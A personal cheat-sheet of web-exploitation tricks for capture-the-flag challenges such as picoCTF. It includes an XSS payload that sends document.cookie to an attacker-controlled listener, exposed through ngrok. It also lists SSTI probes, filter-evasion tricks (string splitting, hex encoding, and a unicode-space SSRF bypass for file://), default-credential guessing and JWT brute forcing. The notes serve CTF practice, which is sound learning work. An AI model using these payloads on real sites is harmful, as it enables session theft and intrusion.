- PHP challenges are always either LFI, webshell uploads, type juggling or a mix of the 3!

- Go through robots.txt and sitemap.xml
- Check if it shows Server: and if anything's vulnerable



- If it's reading through source or something do:
	- wget -m http://ctfSite.com && wget http://ctfSite.com/robots.txt && grep -R "picoCTF"
		- "" could be "ctfName" or "{" or "}" or "picoCTF{.\*?}"


- Facing login page:
	- Try admin:admin
	- Try signup as admin:randomPass
	- Login as a normal user and then try to retrieve cookie through a posting page like 
			- <script>new Image().src='http://listening?c='+document.cookie</script>
			- Note: You could use ngrok to host for free to receive the bug by doing 
				- python3 -m http.server 8008
				- ngrok http 8008

- Facing an text to pdf functionality where your details get turned into pdf to view
	- In burp, enable binary in scope and try to find out the version of the pdf converter and look for previous cve's to exploit and google around.
	- When going through the burp suite response, you might find out about the type of pdf producer and look for cve's.

- Facing any comment section, or posting functionality like todo list etc.
	- We can try <h1>hi</h1>
	- Try SSTI polyglots and xss polyglots etc.
	- See if any parameters have values reflected onto the page and try polyglots on them or xss etc. or ssti.
	- Bypass filters in parameters by just doing pop'+'en if popen is blocked etc.
	- In SSTI bypass, convert ls flag.txt to hex \x version for encoding and bypass

- If jwt is used, we could try to brute force it (https://www.youtube.com/watch?v=3LRZsnSyDrQ)

- Facing giving many details about yourself (profile page):
	- You could try SSTI by putting this payload in everything:
	-  `` {{8*8}}
	-  `` {{10+10}}
	        

- XSS:



- SSRF filter bypass:
	- When black list disables file:// etc. Try to use whitespaces like below:
		- %C2%A0file:///usr/bin/bash This is basically <whitespace>file....
			- Actually just doing _file... where _ is spacebar didnt work. Instead we had to change it up as that was filtered and ignored. Unlike the UTF-8 url encoding. This had to be %c2%a0 not %a0 alone as utf-8 works not windows
			- Another way is to go to console and do:
				- copy('\u00a0') which is unicode whitespace
				- then paste it before file... and that works as a bypass as well